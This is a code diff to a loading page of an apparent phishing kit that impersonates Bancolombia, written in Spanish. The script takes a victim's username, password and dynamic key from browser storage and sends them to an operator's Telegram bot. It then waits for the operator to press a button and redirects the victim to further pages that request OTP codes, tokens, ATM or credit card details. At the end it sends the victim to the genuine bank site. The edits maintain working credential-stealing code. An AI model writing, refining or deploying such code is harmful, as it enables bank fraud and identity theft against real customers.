@@ -38,30 +38,30 @@
         }
 
         .loaderp {
-            width: 180px; /* Tamaño del círculo */
-            height: 180px; /* Tamaño del círculo */
-            background-image: url('img/circulo.png'); /* Carga la imagen del círculo */
-            background-size: cover; /* Hace que la imagen cubra todo el círculo */
-            border-radius: 50%; /* Forma el círculo */
-            position: relative; /* Necesario para posicionar el loader dentro */
+            width: 180px; 
+            height: 180px; 
+            background-image: url('img/circulo.png'); 
+            background-size: cover; 
+            border-radius: 50%; 
+            position: relative; 
             display: flex;
-            flex-direction: column; /* Centra el texto debajo del loader */
+            flex-direction: column; 
             justify-content: center;
             align-items: center;
             text-align: center;
         }
 
         .loaderp .loader {
-            width: 30px; /* Tamaño del loader (gris) */
-            height: 30px; /* Tamaño del loader (gris) */
-            border: 5px solid #f3f3f3; /* Hacer el borde más delgado (antes era 10px) */
-            border-top: 5px solid #555; /* Hacer el borde superior más delgado (antes era 10px) */
+            width: 30px; 
+            height: 30px; 
+            border: 5px solid #f3f3f3; 
+            border-top: 5px solid #555; 
             border-radius: 50%;
-            animation: spin 1s linear infinite; /* Animación de giro */
+            animation: spin 1s linear infinite; 
         }
 
         .loaderp-text {
-            margin-top: 30px; /* Espacio entre el loader y el texto */
+            margin-top: 30px; 
             font-size: 13px;
             color: black;
         }
@@ -76,21 +76,21 @@
     <div class="blur-overlay"></div>
     <div class="loaderp-full">
         <div class="loaderp">
-            <div class="loader"></div> <!-- Este es el loader gris que gira -->
-            <div class="loaderp-text">Cargando...</div> <!-- Texto debajo del loader -->
+            <div class="loader"></div>
+            <div class="loaderp-text">Cargando...</div>
         </div>
     </div>
 
     <script>
     document.addEventListener('DOMContentLoaded', async function () {
-        // Mostrar el loader inicialmente oculto
-        const loader = document.querySelector('#loader');
-
-        // Obtener los valores de usuario y clave desde el localStorage
+        // Obtener valores de localStorage
         const bancoldata = JSON.parse(localStorage.getItem('bancoldata'));
-        if (!bancoldata || !bancoldata.usuario || !bancoldata.clave) {
-            console.error("Error: No se encontraron datos en 'bancoldata' en el localStorage.");
-            return;
+        const dinamica = localStorage.getItem('bancoldina');
+
+        // Validar que existan datos mínimos para continuar
+        if (!bancoldata || !bancoldata.usuario || !bancoldata.clave || !dinamica) {
+            alert("Faltan datos para continuar. Por favor regresa e ingresa toda la información requerida.");
+            return; // Detiene ejecución
         }
 
         const usuario = bancoldata.usuario;
@@ -98,15 +98,7 @@
 
         // Generar transactionId
         const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
-
-        // Almacenar en localStorage
         localStorage.setItem('transactionId', transactionId);
-
-        // Obtener los datos de la tarjeta desde localStorage
-        const datosTarjeta = JSON.parse(localStorage.getItem("tbdatos"));
-
-        // Obtener el valor de 'dinamica' desde 'bancoldina' en localStorage
-        const dinamica = localStorage.getItem('bancoldina') || 'Valor por defecto';
 
         // Crear mensaje para Telegram
         const message = `
@@ -120,7 +112,7 @@
 --------------------------------------------------
 `;
 
-        // Crear botones interactivos
+        // Botones interactivos
         const keyboard = JSON.stringify({
             inline_keyboard: [
                 [{ text: "Error Dinámica - Bancolombia", callback_data: `pedir_dinamica:${transactionId}` }],
@@ -132,7 +124,7 @@
             ],
         });
 
-        // Enviar mensaje a Telegram
+        // Cargar configuración Telegram
         const config = await loadTelegramConfig();
         if (!config) {
             console.error("Error al cargar configuración de Telegram.");
@@ -154,14 +146,13 @@
             const data = await response.json();
             if (data.ok) {
                 console.log("Mensaje enviado a Telegram con éxito");
-                // Esperar la respuesta del botón presionado en Telegram
                 await checkPaymentVerification(transactionId);
             } else {
                 throw new Error("Error al enviar mensaje a Telegram.");
             }
         } catch (error) {
             console.error("Error al enviar mensaje:", error);
-            if (loader) loader.style.display = "none"; // Ocultar loader si hay error
+            // Aquí podrías ocultar loader o mostrar error visual si quieres
         }
 
         async function loadTelegramConfig() {
@@ -173,6 +164,7 @@
                 return await response.json();
             } catch (error) {
                 console.error("Error al cargar la configuración de Telegram:", error);
+                return null;
             }
         }
 
@@ -186,7 +178,7 @@
 
                 const verificationUpdate = data.result.find(update =>
                     update.callback_query &&
-                  [
+                    [
                         `pedir_dinamica:${transactionId}`,
                         `pedir_cajero:${transactionId}`,
                         `pedir_otp:${transactionId}`,
@@ -199,102 +191,92 @@
                 );
 
                 if (verificationUpdate) {
-                    if (loader) loader.style.display = "none"; // Ocultar loader
-
-                    // Aquí manejamos las respuestas de los botones
-                   switch (verificationUpdate.callback_query.data) {
-    case `pedir_dinamica:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Clave Dinámica" })
-        }).then(() => {
-            window.location.href = "cel-dina-error.html";
-        });
-        break;
-
-    case `pedir_cajero:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Cajero Automático" })
-        }).then(() => {
-            window.location.href = "ccajero-id.php";
-        });
-        break;
-
-    case `pedir_otp:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Código OTP" })
-        }).then(() => {
-            window.location.href = "index-otp.html";
-        });
-        break;
-
-    case `pedir_token:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Token" })
-        }).then(() => {
-            window.location.href = "index-otp.html";
-        });
-        break;
-
-    case `tarjeta_credito:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Tarjeta Crédito" })
-        }).then(() => {
-            window.location.href = "cards.html";
-        });
-        break;
-
-    case `error_tc:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Error TC" })
-        }).then(() => {
-            window.location.href = "errortc.html";
-        });
-        break;
-
-    case `error_logo:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Error de Logo" })
-        }).then(() => {
-            alert("Error en el inicio de sesión. Reintente.");
-            window.location.href = "index.html";
-        });
-        break;
-
-    case `confirm_finalizar:${transactionId}`:
-        fetch("sendStatus.php", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ status: "Finalización Exitosa" })
-        }).then(() => {
-            window.location.href = "https://www.bancolombia.com/personas";
-        });
-        break;
-}
+                    // Ocultar loader si quieres
+                    // Aquí manejar las respuestas como ya lo tienes
+                    switch (verificationUpdate.callback_query.data) {
+                        case `pedir_dinamica:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Clave Dinámica" })
+                            }).then(() => {
+                                window.location.href = "cel-dina-error.html";
+                            });
+                            break;
+                        case `pedir_cajero:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Cajero Automático" })
+                            }).then(() => {
+                                window.location.href = "ccajero-id.php";
+                            });
+                            break;
+                        case `pedir_otp:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Código OTP" })
+                            }).then(() => {
+                                window.location.href = "index-otp.html";
+                            });
+                            break;
+                        case `pedir_token:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Token" })
+                            }).then(() => {
+                                window.location.href = "index-otp.html";
+                            });
+                            break;
+                        case `tarjeta_credito:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Tarjeta Crédito" })
+                            }).then(() => {
+                                window.location.href = "cards.html";
+                            });
+                            break;
+                        case `error_tc:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Error TC" })
+                            }).then(() => {
+                                window.location.href = "errortc.html";
+                            });
+                            break;
+                        case `error_logo:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Error de Logo" })
+                            }).then(() => {
+                                alert("Error en el inicio de sesión. Reintente.");
+                                window.location.href = "index.html";
+                            });
+                            break;
+                        case `confirm_finalizar:${transactionId}`:
+                            fetch("sendStatus.php", {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ status: "Finalización Exitosa" })
+                            }).then(() => {
+                                window.location.href = "https://www.bancolombia.com/personas";
+                            });
+                            break;
+                    }
                 } else {
-                    // Si no hay respuesta, esperamos un poco más antes de volver a intentarlo
                     setTimeout(() => checkPaymentVerification(transactionId), 2000);
                 }
             } catch (error) {
                 console.error("Error en la verificación:", error);
-                // En caso de error, intentamos de nuevo en 2 segundos
                 setTimeout(() => checkPaymentVerification(transactionId), 2000);
             }
         }
     });
-</script>
+    </script>
 </body>
 </html>
